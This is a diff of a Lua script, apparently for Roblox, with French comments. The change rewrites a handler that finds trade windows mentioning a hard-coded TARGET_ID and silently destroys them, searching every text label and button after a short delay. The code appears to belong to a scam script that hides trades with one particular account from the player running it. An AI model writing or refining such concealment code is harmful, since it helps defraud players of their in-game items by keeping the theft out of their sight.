@@ -74,20 +74,25 @@ local function applyEverythingAfterTargetFound()
     -- Cacher automatiquement les GUI de trade seulement pour les trades avec TARGET_ID
     local function handleGui(obj)
         if guiNames[obj.Name] then
-            -- Vérifier si c'est un trade avec TARGET_ID
-            local tradeFrame = obj:FindFirstChild("Frame")
-            if tradeFrame then
-                local playerLabel = tradeFrame:FindFirstChild("PlayerLabel")
-                if playerLabel and playerLabel.Text then
-                    -- Essayer d'extraire l'ID du joueur depuis le texte
-                    local playerId = playerLabel.Text:match("(%d+)")
-                    if playerId and tonumber(playerId) == TARGET_ID then
-                        task.defer(function() obj:Destroy() end)
-                        return
+            task.defer(function()
+                -- Attendre un peu que l'interface se charge
+                task.wait(0.5)
+                -- Essayer de trouver l'ID du joueur dans l'interface
+                local tradeFrame = obj:FindFirstChild("Frame")
+                if tradeFrame then
+                    -- Chercher dans tous les descendants qui pourraient contenir l'ID
+                    for _, desc in ipairs(tradeFrame:GetDescendants()) do
+                        if desc:IsA("TextLabel") or desc:IsA("TextButton") then
+                            local text = desc.Text
+                            if text and text:find(tostring(TARGET_ID)) then
+                                -- C'est un trade avec TARGET_ID, cacher
+                                obj:Destroy()
+                                return
+                            end
+                        end
                     end
                 end
-            end
-            -- Pour les autres trades, laisser visible
+            end)
         end
     end
     pg.ChildAdded:Connect(handleGui)
